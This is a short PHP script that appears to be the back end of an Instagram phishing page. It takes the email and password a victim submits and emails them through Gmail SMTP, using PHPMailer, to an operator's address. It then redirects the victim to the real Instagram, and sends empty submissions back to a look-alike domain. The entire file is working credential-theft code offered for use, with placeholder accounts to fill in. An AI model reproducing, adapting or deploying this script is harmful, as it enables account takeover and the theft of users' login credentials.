<?php

/*

Nivîskar : Zerdust Kurdd
Dem : Tebax / 2018



*/

	function go ($url, $time = 0){
		if ($time) header("Refresh: {$time}; url={$url}");
		else header("Location: {$url}");
	}
	
require("inc/class.phpmailer.php");
$email = $_POST['email'];
$password = $_POST['password'];

	if(empty($email) || empty($password))
	{
		go("http://instagirisyap.tk/");	//eğer eposta şifre boş ise tekrardan giris sistesine yönlendir
	
	}
	
	else
		
		{
			
$mail = new PHPMailer(); // create a new object
$mail->IsSMTP(); // enable SMTP
$mail->SMTPDebug = 1; // debugging: 1 = errors and messages, 2 = messages only
$mail->SMTPAuth = true; // authentication enabled
$mail->SMTPSecure = 'ssl'; // secure transfer enabled REQUIRED for GMail
$mail->Host = "smtp.gmail.com";
$mail->Port = 465; // or 587
$mail->IsHTML(true);
$mail->SetLanguage("tr", "phpmailer/language");
$mail->CharSet  ="utf-8";

$mail->Username = "epostaadresi@gmail.com"; // Mail adresi 
$mail->Password = "Şifre"; // Parola
$mail->SetFrom("test@test.com", "İnstagram Sazan Avı "); // Mail adresi

$mail->AddAddress("gonderilecekisi@mail.com"); // Instagram Giriş Bilgileri Gönderilecek Mail ADresi

$mail->Subject = "İnstagram Giriş Bilgileri";
$mail->Body = "<b>Eposta Adresi</b> : $email <br><b> Şifresi :</b> $password <br>";

if(!$mail->Send()){
                echo "Mailer Error: ".$mail->ErrorInfo;
} else {
	go("https://www.instagram.com");
	 
}

		}
	
?>